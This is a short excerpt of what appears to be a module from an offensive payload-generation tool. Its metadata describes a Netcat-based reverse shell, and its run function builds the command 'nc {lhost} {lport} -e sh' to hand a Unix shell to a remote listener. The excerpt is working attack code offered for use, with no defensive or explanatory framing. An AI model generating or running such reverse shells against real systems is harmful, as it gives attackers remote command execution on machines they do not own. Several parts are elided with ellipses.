...
metadata = {
    ...
    "description": "A Netcat-based reverse shell that establishes a remote command execution session using the simple Unix shell.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
...
def run(args):
    ...
    netcat_command = f"nc {lhost} {lport} -e sh"
